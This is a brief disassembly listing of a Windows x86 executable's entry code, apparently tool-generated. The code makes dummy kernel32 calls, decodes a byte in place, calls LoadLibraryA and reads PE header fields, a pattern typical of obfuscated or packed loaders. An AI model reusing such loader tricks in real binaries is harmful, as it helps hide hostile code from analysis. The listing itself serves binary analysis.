0x004d0008:	movl	%edi, %edi	; from: 0x004d047d(MAY)
0x004d000a:	pushl	%ebp
0x004d000b:	movl	%esp, %ebp
0x004d000d:	subl	$0x28, %esp
0x004d0010:	leal	0x004d3138, %esi
0x004d0016:	subl	-224(%esi), %ebx

start:
0x004d0440:	pushl	$0x0
0x004d0442:	call	lstrlen@kernel32.dll	; targets: 0xff000250(MAY)
0x004d0448:	call	IsBadStringPtrW@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004d044e:	subl	$0x8, %esp
0x004d0451:	call	IsBadStringPtrW@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004d0457:	subl	$0x8, %esp
0x004d045a:	xorl	%eax, %eax
0x004d045c:	leal	0x4d3100(,%eax,2), %eax
0x004d0463:	leal	0x4(%eax), %ecx
0x004d0466:	addb	$0xffffffb0, (%ecx)
0x004d0469:	pushl	%eax
0x004d046a:	call	LoadLibraryA@kernel32.dll	; targets: 0xff000230(MAY)
0x004d0470:	movl	0x3c(%eax), %ecx
0x004d0473:	pushl	0x29(%eax,%ecx)
0x004d0477:	popl	%eax
0x004d0478:	movb	$0x2c, %cl
0x004d047a:	cmpb	%cl, %al
0x004d047c:	pusha	
0x004d047d:	ja	0x004d0008	; targets: 0x004d0008(MAY), 0x004d0483(MAY)
0x004d0483:	popa		; from: 0x004d047d(MAY)
0x004d0484:	ret	; targets: unresolved

